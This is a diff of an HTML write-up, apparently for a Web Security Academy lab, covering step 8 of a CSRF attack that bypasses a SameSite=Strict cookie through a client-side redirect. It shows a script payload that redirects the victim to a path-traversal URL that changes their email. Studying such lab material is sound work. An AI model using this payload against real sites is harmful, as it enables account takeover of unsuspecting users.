@@ -195,9 +195,7 @@
 <hr>
 <p><strong>Step 8 — Build exploit and deliver to victim</strong></p>
 <p>Pasted the following payload into the exploit server body:</p>
-<pre><code class="language-html">&lt;script&gt;
-document.location = "https://LAB-ID.web-security-academy.net/post/comment/confirmation?postId=/../my-account/change-email?email=test3%40test.com%26submit=1";
-&lt;/script&gt;</code></pre>
+<pre><code class="language-html">&lt;script&gt;<br>document.location = "https://LAB-ID.web-security-academy.net/post/comment/confirmation?postId=/../my-account/change-email?email=test3%40test.com%26submit=1";<br>&lt;/script&gt;</code></pre>
 <p>Clicked “Deliver exploit to victim”. The victim’s browser navigated to the exploit page, which immediately redirected to the confirmation URL. The same-site redirect carried their SameSite=Strict session cookie to the email change endpoint. The lab banner updated to <strong>Solved</strong>, and the My Account page confirmed the email was changed to <code>test3@test.com</code>.</p>
 <blockquote>  <figure><img src="images/lab-8-csrf-with-samesite-strict-bypass-via-client-side-redirect/38ab75237172806896dcf6af3752c7f9.png" alt="screenshot" loading="lazy"></figure>
   <figure><img src="images/lab-8-csrf-with-samesite-strict-bypass-via-client-side-redirect/38ab752371728052ae3fea60db733c75.png" alt="screenshot" loading="lazy"></figure>
